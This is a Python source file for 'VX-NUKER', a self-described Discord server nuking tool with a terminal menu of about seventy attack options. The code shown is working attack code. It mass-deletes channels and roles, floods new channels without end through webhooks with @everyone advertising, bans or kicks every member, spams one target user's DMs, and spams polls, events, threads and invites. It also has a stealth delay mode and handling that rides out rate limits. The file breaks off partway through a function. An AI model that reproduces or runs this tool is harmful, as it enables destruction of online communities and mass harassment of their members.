# VX-NUKER - Main Script
# Description: Discord server nuking tool with TUI interface

import os, sys, time, random, asyncio, json, re, webbrowser
import urllib.request
import aiohttp
from datetime    import datetime, timezone, timedelta
from shutil      import get_terminal_size
from colorama    import init

import discord
from discord.ext import commands
from discord     import Activity, ActivityType

init(autoreset=True)

_CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

def _load_config():
    try:
        with open(_CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

_cfg = _load_config()

NO_BAN_KICK_ID = _cfg.get("no_ban_kick_ids", [])

DISCORD_URL = _cfg.get("discord_url", "https://discord.gg/QAkKn3a8ya")
GITHUB_URL  = _cfg.get("github_url", "https://guns.lol/vxsociety")
RAID_NAME   = _cfg.get("raid_name", "raid-by-vx")
TOOL_NAME   = _cfg.get("tool_name", "VX-NUKER")
GIF_BANNER  = _cfg.get("gif_banner", "https://media.discordapp.net/attachments/1359542047794528407/1366981943622893648/0427-1.gif")
WEBHOOK_AVATAR = "https://files.catbox.moe/wgke8n.png"

_STEALTH_MODE = False
_STEALTH_DELAY = (0.5, 1.5)  # min, max seconds

_discord_short = DISCORD_URL.replace("https://", "")
PUB         = f"||@everyone||\n\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n> \u2590\u2588\u2588 **{TOOL_NAME}**\n> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n> *server claimed by **VX SOCIETY**.*\n> \n> \u25AA [**VX SOCIETY**]({DISCORD_URL})\n> \u25AA [**Guns.lol VX SOCIETY**]({GITHUB_URL})"
PUB_SHORT   = f"{_discord_short} \u00b7 guns.lol/vxsociety"

_stop_flag = False

_ar_cfg = _cfg.get("auto_raid", {})
AUTO_RAID_CONFIG = {
    "channel_type"   : _ar_cfg.get("channel_type", "text"),
    "channel_name"   : RAID_NAME,
    "num_channels"   : _ar_cfg.get("num_channels", 50),
    "num_messages"   : _ar_cfg.get("num_messages", 10),
    "message_content": PUB,
}

EMBED_CONFIG = {
    "title"      : f"\u2590\u2588\u2588  {TOOL_NAME}",
    "description": (
        "```ansi\n"
        "\u2591\u2592\u2593\u2588 Server compromised. \u2588\u2593\u2592\u2591\n"
        "```\n"
        "||@everyone||\n\n"
        f"> \u25AA **Discord** \u2500 {DISCORD_URL}\n"
        f"> \u25AA **Github** \u2500 {GITHUB_URL}\n"
        "> \u25AA **YouTube** \u2500 {DISCORD_URL}\n"
        "\n\u2800"
    ),
    "color"      : 0xDC143C,
    "message"    : "||@everyone||",
    "image"      : GIF_BANNER,
    "footer"     : f"VX SOCIETY \u2502 {TOOL_NAME} v1.0.0 \u2502 \u25aa\u25aa\u25aa",
    "fields"     : [],
}

_wh_cfg = _cfg.get("webhook", {})
WEBHOOK_CONFIG = {"default_name": _wh_cfg.get("default_name", "VX-NUKER")}
_srv_cfg = _cfg.get("server", {})
SERVER_CONFIG  = {
    "new_name"       : _srv_cfg.get("new_name", "RAIDED BY VX-NUKER"),
    "new_icon"       : _srv_cfg.get("new_icon", ""),
    "new_description": _srv_cfg.get("new_description", _discord_short),
}
_bp_cfg = _cfg.get("bot_presence", {})
BOT_PRESENCE = {"type": _bp_cfg.get("type", "playing"), "text": _bp_cfg.get("text", _discord_short)}

RS  = "\033[0m";  B   = "\033[1m"
R0  = "\033[38;5;9m"
R1  = "\033[38;5;196m";  R2  = "\033[38;5;160m";  R3  = "\033[38;5;124m"
R4  = "\033[38;5;88m";   R5  = "\033[38;5;52m"
DIM = "\033[38;5;240m";  D2  = "\033[38;5;235m";  D3  = "\033[38;5;233m"
WHT = "\033[38;5;252m";  GRY = "\033[38;5;245m"

def r1(t):  return f"{R1}{B}{t}{RS}"
def r2(t):  return f"{R2}{t}{RS}"
def r3(t):  return f"{R3}{t}{RS}"
def dim(t): return f"{DIM}{t}{RS}"
def wht(t): return f"{WHT}{B}{t}{RS}"

def _TW():   return min(get_terminal_size((100,30)).columns, 110)
def _clr():  os.system('cls' if os.name == 'nt' else 'clear')
def _vis(s): return re.sub(r'\033\[[^m]*m','',s)
def _vl(s):  return len(_vis(s))

def fx_glitch(text: str, n=5):
    gc = "!@#$%^&*?+"
    for i in range(n):
        g = "".join(random.choice(gc) if random.random()<.18 else c for c in text)
        col = R1 if i%2 else R3
        sys.stdout.write(f"\r  {col}{B}{g}{RS}"); sys.stdout.flush(); time.sleep(.05)
        sys.stdout.write(f"\r{' '*(_vl(text)+6)}"); sys.stdout.flush(); time.sleep(.025)
    sys.stdout.write(f"\r  {R1}{B}{text}{RS}\n"); sys.stdout.flush()

def fx_load(label: str, w=26, delay=.002):
    print(f"\n  {R1}{B}::{RS} {wht(label)}  {R1}{B}ready{RS}\n")

def fx_spin(label: str, dur=.9):
    sys.stdout.write(f"  {R1}{B}+{RS}  {wht(label)}\n"); sys.stdout.flush()

_LOGS: list[str] = []

def _ts():  return f"{D2}[{DIM}{datetime.now().strftime('%H:%M:%S')}{D2}]{RS}"
def _log(p, m):
    print(f"  {_ts()} {p} {WHT}{m}{RS}")
    _LOGS.append(f"[{datetime.now().strftime('%H:%M:%S')}] {_vis(m)}")

def log_ok  (m): _log(f"{R1}{B}[+]{RS}", m)
def log_err (m): _log(f"{R3}{B}[-]{RS}", m)
def log_warn(m): _log(f"{R2}{B}[!]{RS}", m)
def log_info(m): _log(f"{DIM}[*]{RS}",   m)

def _ask(prompt: str) -> str:
    return input(f"\n  {R1}{B}>>{RS} {wht(prompt)} {D2}:{RS} ").strip()

def _confirm(p: str) -> bool:
    return input(f"\n  {R2}[?]{RS} {wht(p)} {DIM}[yes/no]{RS} {D2}:{RS} ").strip().lower() == "yes"

def _section(title: str):
    w = 58
    grad = f"{R5}▐{R4}▐{R3}▌{R2}▌{R1} {RS}"
    print(f"\n  {D3}{'━'*w}{RS}")
    print(f"  {grad}{R1}{B}{title}{RS}")
    print(f"  {D3}{'━'*w}{RS}\n")

def _summary(action: str, ok: int, fail: int, t: float):
    print(f"\n  {D3}┌{'─'*42}┐{RS}")
    print(f"  {D3}│{RS}  {GRY}action{RS}  {wht(action)}{' '*(28-_vl(action))}{D3}│{RS}")
    print(f"  {D3}│{RS}  {R1}◆{RS} {R2}{ok}{RS} {GRY}ok{RS}   {R4}◇{RS} {DIM}{fail}{RS} {GRY}err{RS}   {D2}⏱{RS} {DIM}{t:.2f}s{RS}{' '*10}{D3}│{RS}")
    print(f"  {D3}└{'─'*42}┘{RS}\n")

def _get_guild(sid: str):
    g = bot.get_guild(int(sid))
    if not g: log_err("servidor no encontrado")
    return g

_ART = [
    r"                                                     ",
    r"                                                     ",
    r"                                                     ",
    r"                                                     ",
    r"                                                     ",
    r"                                                     ",
    r"   ██╗   ██╗██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗ ",
    r"   ██║   ██║╚██╗██╔╝    ████╗  ██║██║   ██║██║ ██╔╝ ",
    r"   ██║   ██║ ╚███╔╝     ██╔██╗ ██║██║   ██║█████╔╝  ",
    r"   ╚██╗ ██╔╝ ██╔██╗     ██║╚██╗██║██║   ██║██╔═██╗  ",
    r"    ╚████╔╝ ██╔╝ ██╗    ██║ ╚████║╚██████╔╝██║  ██╗ ",
    r"     ╚═══╝  ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝ ",
    r"                                                     ",
    r"                                                     ",
    r"    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ",
    r"    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗",
    r"    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║",
    r"    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║",
    r"    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝",
    r"    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ",
]
_SHADES = [R5, R5, R4, R4, R3, R3, R2, R2, R1, R1, R0, R1, R1, R2, R2, R3, R3, R4, R4, R5]

async def _print_banner_async(bot_n="", srv_n="", members=0, animated=False):
    print()
    for i, line in enumerate(_ART):
        c = _SHADES[i % len(_SHADES)]
        print(f"  {c}{line}{RS}")
        if animated: await asyncio.sleep(.02)
    print()
    print(f"  {R1}{B}VX-NUKER{RS} {DIM}v1.0.0{RS}  {R3}│{RS}  {GRY}VX SOCIETY Dev{RS}  {R3}│{RS}  {GRY}VX SOCIETY - Nuking Tool{RS}")
    print()
    if bot_n:
        info = f"  {D2}┌─{RS} {GRY}bot{RS} {r1(bot_n)}  {D3}│{RS}  {GRY}server{RS} {wht(srv_n or '-')}  {D3}│{RS}  {GRY}members{RS} {r1(str(members))} {D2}─┐{RS}"
        print(info)
        print()

def _print_banner(bot_n="", srv_n="", members=0, animated=False):
    print()
    for i, line in enumerate(_ART):
        c = _SHADES[i % len(_SHADES)]
        print(f"  {c}{line}{RS}")
    print()
    print(f"  {R1}{B}VX-NUKER{RS} {DIM}v1.0.0{RS}  {R3}│{RS}  {GRY}VX SOCIETY Dev{RS}  {R3}│{RS}  {GRY}VX SOCIETY - Nuking Tool{RS}")
    print()
    if bot_n:
        info = f"  {D2}┌─{RS} {GRY}bot{RS} {r1(bot_n)}  {D3}│{RS}  {GRY}server{RS} {wht(srv_n or '-')}  {D3}│{RS}  {GRY}members{RS} {r1(str(members))} {D2}─┐{RS}"
        print(info)
        print()

_MENU = [
    [
        [("01","Nuke"),  ("02","Auto Raid"),  ("03","Ban All"),  ("04","Kick All")],
        [("05","Mute All"),  ("06","Unban All"),  ("07","Del Channels"),  ("08","Del Emojis")],
        [("09","Del Stickers"),  ("10","Create Channels"),  ("11","Create Roles"),  ("12","Create Cats")],
        [("13","Rename Channels"),  ("14","Rename Roles"),  ("15","Edit Server"),  ("16","Rename Members")],
        [("17","Fix Nicks"),  ("18","Get Admin"),  ("19","Impersonate"),  ("20","Ghost Ping")],
    ],
    [
        [("21","Remov Roles"),  ("22","Message All"),  ("23","DM Spam User"),  ("24","Webhook Spam")],
        [("25","Server Info"),  ("26","Clone Server"),  ("27","Webhook Logs"),  ("28","Lockdown")],
        [("29","Sourdine VC"),  ("30","Kick VC All"),  ("31","Move All VC"),  ("32","Invite Spam")],
        [("33","Spam"),  ("34","Thread Spam"),  ("35","Reaction Spam"),  ("36","Voice Spam")],
        [("37","Spoiler Spam"),  ("38","Poll Spam"),  ("39","Event Spam"),  ("40","Quit")],
    ],
    [
        [("41","Purge Msgs"),  ("42","Export Logs"),  ("43","Slowmode All"),  ("44","Webhook Nuke")],
        [("45","Role All"),  ("46","Topic Spam"),  ("47","Perm Override"),  ("48","Steal Emojis")],
        [("49","Prune Members"),  ("50","Change Server"),  ("51","Raid Presets"),  ("52","Sched Raid")],
        [("53","Stealth Mode"),  ("54","Server Nuke"),  ("55","Forum Spam"),  ("56","Stage Spam")],
        [("57","Restore Srv"),  ("58","Perms Nuke"),  ("59","Icon Rotate"),  ("60","Stats")],
        [("61","Del Roles"),  ("62","Del Cats"),  ("63","Rename Cats"),  ("64","Clone Roles")],
        [("65","Clone Chans"),  ("66","Ban Bots"),  ("67","Ban by ID"),  ("68","Blitz Raid")],
        [("69","Auto Status"),  ("70","Quit")],
    ],
]

def _print_menu(page: int = 1):
    rows = _MENU[page-1]
    print(f"\n  {R1}{B}VX-NUKER{RS}  {DIM}v1.0.0{RS}\n")
    for i, row in enumerate(rows):
        for num, label in row:
            print(f"    {R2}[{num}]{RS}  {WHT}{label}{RS}")
        if i < len(rows)-1:
            print()
    prev = r1("«b»") if page > 1 else dim("   ")
    nxt  = r1("«n»") if page < 3 else dim("   ")
    print(f"\n  {prev} {dim('prev')}    {dim(f'page {page}/3')}    {nxt} {dim('next')}    {dim('«q» quit')}")
    print(f"\n  {R2}▸{RS} ", end="", flush=True)

def _pub_append(content: str) -> str:
    if _discord_short in content: return content
    return f"{content}\n{PUB}"

async def delete_channel(c) -> bool:
    try:
        await c.delete(); log_ok(f"#{c.name}"); return True
    except discord.Forbidden:          log_err(f"sin permiso #{c.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} #{c.name}")
    return False

async def delete_role(r) -> bool:
    if r.is_default(): return False
    try:
        await r.delete(); log_ok(f"@{r.name}"); return True
    except discord.Forbidden:          log_err(f"sin permiso @{r.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} @{r.name}")
    return False

async def create_channel(guild, typ, name):
    try:
        c = (await guild.create_text_channel(name) if typ == 'text' else await guild.create_voice_channel(name))
        log_ok(f"#{c.name}"); return c
    except discord.Forbidden:          log_err(f"sin permiso para crear {typ}")
    except discord.HTTPException as e: log_err(f"http{e.status}")
    return None

async def _send_embed(target, everyone=False):
    try:
        cfg = EMBED_CONFIG
        e   = discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
        for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
        if cfg["image"]: e.set_image(url=cfg["image"])
        e.set_footer(text=cfg["footer"])
        c = f"@everyone {cfg['message']}" if everyone else cfg['message']
        await target.send(content=c, embed=e)
        log_ok(f"embed -> {getattr(target,'name',str(target))}")
    except Exception as ex: log_err(_vis(str(ex)))

async def _send_to(chan, count, content, everyone):
    final = _pub_append(content)
    async def _fire(i):
        try:
            if content.lower() == 'embed': await _send_embed(chan, everyone)
            else: await chan.send(final)
            log_ok(f"[{i+1}/{count}] #{chan.name}")
        except discord.Forbidden:          log_err(f"sin permiso #{chan.name}")
        except discord.HTTPException as e: log_err(f"http{e.status} #{chan.name}")
    await asyncio.gather(*[_fire(i) for i in range(count)])

async def _mk_role(g):
    try:
        col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
        await g.create_role(name="VX-NUKER", colour=col); return True
    except: return False

def _skip(m, bot_id):
    if m.id == bot_id: return True
    if m.id in NO_BAN_KICK_ID: log_warn(f"skip {m.name}"); return True
    return False

async def nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ATAQUE TOTAL")
    log_warn(f"{g.name}  {dim(f'{len(g.channels)}ch / {len(g.roles)}roles')}")
    if not _confirm(f"destruir todo {g.name}"): return log_info("cancelado")
    t = time.perf_counter()
    fx_load("eliminando canales y roles", 26, .002)
    cr, rr = await asyncio.gather(
        asyncio.gather(*[delete_channel(c) for c in list(g.channels)]),
        asyncio.gather(*[delete_role(r) for r in list(g.roles)]),
    )
    log_ok(f"{cr.count(True)} canales  {rr.count(True)} roles eliminados")
    fx_load("creando canales y roles", 22, .002)
    created, roles = await asyncio.gather(
        asyncio.gather(*[g.create_text_channel(RAID_NAME) for _ in range(50)], return_exceptions=True),
        asyncio.gather(*[_mk_role(g) for _ in range(50)]),
    )
    new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
    log_ok(f"{len(new_chans)} canales  {roles.count(True)} roles creados")
    fx_load("spam masivo", 22, .002)
    async def _raid_chan(chan):
        global _stop_flag
        try:
            wh = await chan.create_webhook(name="VX-NUKER")
            msg_count = 0
            while not _stop_flag:
                try:
                    await wh.send(content=f"{PUB}\n{GIF_BANNER}", username="VX-NUKER", avatar_url=WEBHOOK_AVATAR)
                    msg_count += 1
                    if msg_count % 10 == 0:
                        log_ok(f"#{chan.name}  [{msg_count} mensajes]")
                except discord.HTTPException as e:
                    if e.status == 429:
                        log_warn(f"rate limit en #{chan.name}, esperando...")
                        await asyncio.sleep(5)
                    else:
                        log_err(f"http{e.status} #{chan.name}")
                        break
                await asyncio.sleep(0.5)
            try: await wh.delete()
            except: pass
            log_ok(f"#{chan.name}  {msg_count} mensajes enviados")
        except Exception as e: log_err(f"#{chan.name}  {_vis(str(e))}")
    await asyncio.gather(*[_raid_chan(c) for c in new_chans])
    if _stop_flag:
        fx_glitch(f"NUKE DETENIDO  |  {g.name}")
    else:
        fx_glitch(f"NUKE COMPLETO  |  {g.name}")
    _summary("Nuke", len(new_chans), 50-len(new_chans), time.perf_counter()-t)

async def auto_raid(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RAID AUTOMATICO"); log_warn(f"objetivo  {g.name}")
    t = time.perf_counter()
    fx_load("eliminando", 26, .002)
    ch = await asyncio.gather(*[delete_channel(c) for c in list(g.channels)])
    log_ok(f"{ch.count(True)} canales eliminados")
    fx_load("construyendo", 22, .002)
    created, roles = await asyncio.gather(
        asyncio.gather(*[g.create_text_channel(AUTO_RAID_CONFIG['channel_name']) for _ in range(AUTO_RAID_CONFIG['num_channels'])], return_exceptions=True),
        asyncio.gather(*[_mk_role(g) for _ in range(50)]),
    )
    new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
    log_ok(f"{len(new_chans)} canales  {roles.count(True)} roles")
    fx_load("inundando", 22, .002)
    async def _raid_ch(c):
        global _stop_flag
        try:
            wh = await c.create_webhook(name="VX-NUKER")
            msg_count = 0
            while not _stop_flag:
                try:
                    await wh.send(content=f"{PUB}\n{GIF_BANNER}", username="VX-NUKER", avatar_url=WEBHOOK_AVATAR)
                    msg_count += 1
                    if msg_count % 10 == 0:
                        log_ok(f"#{c.name}  [{msg_count} msgs]")
                except discord.HTTPException as e:
                    if e.status == 429:
                        log_warn(f"rate limit #{c.name}, esperando...")
                        await asyncio.sleep(5)
                    else:
                        break
                await asyncio.sleep(0.5)
            log_ok(f"#{c.name}  {msg_count} mensajes")
        except: pass
    await asyncio.gather(*[_raid_ch(c) for c in new_chans])
    fx_glitch(f"RAID TERMINADO  |  {g.name}  |  VX-NUKER")
    _summary("Auto Raid", len(new_chans)+roles.count(True), 0, time.perf_counter()-t)

async def delete_emojis(sid):
    g = _get_guild(sid)
    if not g: return
    emojis = list(g.emojis)
    if not emojis: return log_info("no hay emojis")
    _section("ELIMINAR EMOJIS"); fx_load("wiping", 18, .002)
    t = time.perf_counter()
    async def _d(e):
        try: await e.delete(); log_ok(f":{e.name}:"); return True
        except: return False
    r = await asyncio.gather(*[_d(e) for e in emojis])
    _summary("Del Emojis", r.count(True), r.count(False), time.perf_counter()-t)

async def delete_stickers(sid):
    g = _get_guild(sid)
    if not g: return
    st = list(g.stickers)
    if not st: return log_info("no hay stickers")
    _section("ELIMINAR STICKERS"); fx_load("wiping", 16, .002)
    t = time.perf_counter()
    async def _d(s):
        try: await s.delete(); log_ok(s.name); return True
        except: return False
    r = await asyncio.gather(*[_d(s) for s in st])
    _summary("Del Stickers", r.count(True), r.count(False), time.perf_counter()-t)

async def delete_all_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ELIMINAR CANALES")
    log_warn(f"{g.name}  {dim(f'{len(g.channels)} channels')}")
    if not _confirm(f"eliminar TODOS los canales de {g.name}"): return log_info("canceled")
    fx_load("deleting all channels", 26, .002)
    t = time.perf_counter()
    r = await asyncio.gather(*[delete_channel(c) for c in list(g.channels)])
    fx_glitch(f"ALL CHANNELS DELETED  |  {g.name}")
    _summary("Delete Channels", r.count(True), r.count(False), time.perf_counter()-t)

async def spam_channel(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM")
    try: count = int(_ask("mensajes por canal"))
    except ValueError: return log_err("invalid")
    content  = _ask("contenido [Enter = pub | 'embed' = embed]") or PUB
    everyone = False
    if content.lower() == 'embed': everyone = _ask("¿@everyone? [si/no]").lower() == 'si'
    fx_load("charging", 18, .002)
    t  = time.perf_counter()
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    await asyncio.gather(*[_send_to(c, count, content, everyone) for c in tc])
    _summary("Spam", count*len(tc), 0, time.perf_counter()-t)

async def _send_wh(wh, count, content, everyone):
    final = _pub_append(content)
    async def _fire():
        try:
            if content.lower() == 'embed': await _send_embed(wh, everyone)
            else: await wh.send(content=f"{final}\n{GIF_BANNER}", username="VX-NUKER", avatar_url=WEBHOOK_AVATAR)
            log_ok(f"wh {wh.name}")
        except: pass
    await asyncio.gather(*[_fire() for _ in range(count)])

async def webhook_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM CON WEBHOOKS")
    try: count = int(_ask("mensajes por webhook"))
    except ValueError: return log_err("invalid")
    content  = _ask("contenido [Enter = pub | 'embed' = embed]") or PUB
    everyone = False
    if content.lower() == 'embed': everyone = _ask("@everyone? [yes/no]").lower() == 'yes'
    fx_load("spawning webhooks", 20, .002)
    t   = time.perf_counter()
    whs = await asyncio.gather(*[c.create_webhook(name=WEBHOOK_CONFIG["default_name"]) for c in g.channels if isinstance(c, discord.TextChannel)], return_exceptions=True)
    whs = [w for w in whs if isinstance(w, discord.Webhook)]
    log_info(f"{len(whs)} webhooks")
    await asyncio.gather(*[_send_wh(wh, count, content, everyone) for wh in whs])
    _summary("Webhook Spam", len(whs)*count, 0, time.perf_counter()-t)

async def thread_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE HILOS")
    try: count = int(_ask("hilos por canal"))
    except ValueError: return log_err("invalid")
    name = _ask("nombre del hilo [Enter = pub]") or f"{TOOL_NAME} | {_discord_short}"
    fx_load("spawning", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                m = await chan.send(PUB); await m.create_thread(name=f"{name} {i+1}")
                log_ok(f"#{chan.name} [{i+1}]"); ok += 1
            except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Thread Spam", ok, fail, time.perf_counter()-t)

async def reaction_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE REACCIONES")
    try: limit = int(_ask("mensajes por canal"))
    except ValueError: return log_err("invalid")
    ms_emojis = ["\U0001f1fb","\U0001f1f4","\U0001f1ee","\U0001f1e9","\U0001f300","\U0001f4ab","\U0001f573","\U0001f533","\U0001f517"]
    fx_load("loading", 14, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try:
            async for msg in chan.history(limit=limit):
                for emoji in ms_emojis:
                    try: await msg.add_reaction(emoji); ok += 1
                    except: fail += 1
        except: pass
    _summary("Reaction Spam", ok, fail, time.perf_counter()-t)

async def vc_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE VOZ")
    try: loops = int(_ask("ciclos por canal de voz"))
    except ValueError: return log_err("invalid")
    vcs = [c for c in g.channels if isinstance(c, discord.VoiceChannel)]
    log_info(f"{len(vcs)} VCs"); fx_load("connecting", 14, .002)
    t = time.perf_counter(); ok=fail=0
    for vc in vcs:
        for i in range(loops):
            try:
                conn = await vc.connect(timeout=3.0); await asyncio.sleep(.2); await conn.disconnect(force=True)
                log_ok(f"[{i+1}/{loops}] #{vc.name}"); ok += 1
            except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Voice Spam", ok, fail, time.perf_counter()-t)

async def spoiler_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE SPOILERS")
    try: count = int(_ask("mensajes por canal"))
    except ValueError: return log_err("invalid")
    content = _ask("content  [enter = pub]") or PUB_SHORT
    fx_load("flooding", 16, .002)
    t  = time.perf_counter()
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    wrapped = f"||{content}||\n{PUB}"
    await asyncio.gather(*[_send_to(c, count, wrapped, False) for c in tc])
    _summary("Spoiler Spam", count*len(tc), 0, time.perf_counter()-t)

async def poll_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE ENCUESTAS")
    try: count = int(_ask("encuestas por canal"))
    except ValueError: return log_err("invalid")
    question = _ask("pregunta [Enter = pub]") or f"Join VX-NUKER  |  {PUB_SHORT}"
    fx_load("creating", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                poll = discord.Poll(question=question[:300], duration=timedelta(hours=1))
                poll.add_answer(text=_discord_short)
                poll.add_answer(text="guns.lol/vxsociety")
                await chan.send(poll=poll); log_ok(f"#{chan.name} [{i+1}]"); ok += 1
            except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Poll Spam", ok, fail, time.perf_counter()-t)

async def event_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE EVENTOS")
    try: count = int(_ask("cantidad"))
    except ValueError: return log_err("invalid")
    name = _ask("nombre del evento [Enter = pub]") or "VX-NUKER"
    desc = _ask("descripcion [Enter = pub]") or f"**RAIDED BY VX-NUKER**\n{PUB_SHORT}"
    fx_load("scheduling", 18, .002)
    t = time.perf_counter(); ok=fail=0
    start = datetime.now(timezone.utc)+timedelta(hours=1); end_t = start+timedelta(hours=2)
    for i in range(count):
        try:
            await g.create_scheduled_event(name=f"{name} #{i+1}", description=desc,
                start_time=start+timedelta(minutes=i), end_time=end_t+timedelta(minutes=i),
                entity_type=discord.EntityType.external, location=PUB_SHORT,
                privacy_level=discord.PrivacyLevel.guild_only)
            log_ok(f"{name} #{i+1}"); ok += 1
        except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Event Spam", ok, fail, time.perf_counter()-t)

async def invite_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE INVITACIONES")
    try: count = int(_ask("cantidad"))
    except ValueError: return log_err("invalid")
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not tc: return log_err("no hay canales de texto")
    fx_load("generating", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for _ in range(count):
        try:
            inv = await random.choice(tc).create_invite(max_age=60, max_uses=1, unique=True)
            log_ok(inv.url); ok += 1
        except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Invite Spam", ok, fail, time.perf_counter()-t)

async def ban_all(sid, bot_id):
    g = _get_guild(sid)
    if not g: return
    _section("BANEAR A TODOS")
    if not _confirm(f"banear a TODOS en {g.name}  [{g.member_count} miembros]"): return log_info("cancelado")
    fx_load("preparing", 24, .002)
    t = time.perf_counter()
    async def _b(m):
        if _skip(m, bot_id): return False
        try: await m.ban(reason=PUB_SHORT); log_ok(m.name); return True
        except discord.Forbidden:          log_err(f"no perm {m.name}")
        except discord.HTTPException as e: log_err(f"http{e.status} {m.name}")
        return False
    r = await asyncio.gather(*[_b(m) for m in g.members])
    fx_glitch(f"BAN WAVE  |  {r.count(True)} banned")
    _summary("Ban All", r.count(True), r.count(False), time.perf_counter()-t)

async def kick_all(sid, bot_id):
    g = _get_guild(sid)
    if not g: return
    _section("EXPULSAR A TODOS")
    if not _confirm(f"expulsar a TODOS en {g.name}  [{g.member_count} miembros]"): return log_info("cancelado")
    fx_load("preparing", 24, .002)
    t = time.perf_counter()
    async def _k(m):
        if _skip(m, bot_id): return False
        try: await m.kick(reason=PUB_SHORT); log_ok(m.name); return True
        except discord.Forbidden:          log_err(f"no perm {m.name}")
        except discord.HTTPException as e: log_err(f"http{e.status} {m.name}")
        return False
    r = await asyncio.gather(*[_k(m) for m in g.members])
    _summary("Kick All", r.count(True), r.count(False), time.perf_counter()-t)

async def mute_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SILENCIAR A TODOS")
    try: mins = int(_ask("minutos"))
    except ValueError: return log_err("invalid")
    until = datetime.now(timezone.utc)+timedelta(minutes=mins)
    fx_load("applying", 22, .002)
    t = time.perf_counter()
    async def _m(m):
        if m.bot or m.id in NO_BAN_KICK_ID: return False
        try: await m.timeout(until); log_ok(m.name); return True
        except: return False
    r = await asyncio.gather(*[_m(m) for m in g.members])
    _summary("Mute All", r.count(True), r.count(False), time.perf_counter()-t)

async def _dm(m, content):
    if m.bot: return False
    try: await m.send(content); log_ok(m.name); return True
    except: return False

async def dm_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("MENSAJEAR A TODOS")
    content = _ask("mensaje [Enter = pub]") or PUB
    fx_load("sending", 20, .002)
    t = time.perf_counter()
    r = await asyncio.gather(*[_dm(m, content) for m in g.members])
    _summary("Message All", r.count(True), r.count(False), time.perf_counter()-t)

async def dm_spam_user(sid):
    """Spam DM un user précis par son ID — N messages, message custom ou pub par défaut."""
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DM A USUARIO")

    uid = _ask("ID del usuario objetivo")
    try: uid = int(uid)
    except ValueError: return log_err("ID invalide")

    try: count = int(_ask("cantidad de mensajes"))
    except ValueError: return log_err("nombre invalide")

    msg = _ask("message  [enter = pub par défaut]") or PUB

    target = None
    try:   target = await g.fetch_member(uid)
    except Exception:
        try:   target = await bot.fetch_user(uid)
        except Exception: return log_err(f"user {uid} introuvable")

    log_info(f"target  {target}  ({target.id})")
    log_info(f"envoi de {count} messages...")
    fx_load("spamming DMs", 24, .002)

    t = time.perf_counter(); ok = fail = 0

    for i in range(count):
        try:
            await target.send(msg)
            log_ok(f"[{i+1}/{count}]  {target.name}")
            ok += 1
        except discord.Forbidden:
            log_err(f"DMs fermés —  {target.name}  (impossible d'envoyer)")
            fail += count - i
            break
        except discord.HTTPException as e:
            log_err(f"http{e.status}"); fail += 1
        if (i + 1) % 5 == 0:
            await asyncio.sleep(.6)

    _summary("DM Spam User", ok, fail, time.perf_counter()-t)

async def nick_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENOMBRAR MIEMBROS")
    nick = _ask("apodo [Enter = pub]") or f"VX SOCIETY | {PUB_SHORT}"
    nv   = nick[:32] or None
    fx_load("renaming", 20, .002)
    t = time.perf_counter()
    async def _n(m):
        if m.bot or m.id in NO_BAN_KICK_ID: return False
        try: await m.edit(nick=nv); log_ok(m.name); return True
        except: return False
    r = await asyncio.gather(*[_n(m) for m in g.members])
    _summary("Rename Members", r.count(True), r.count(False), time.perf_counter()-t)

async def strip_roles(sid):
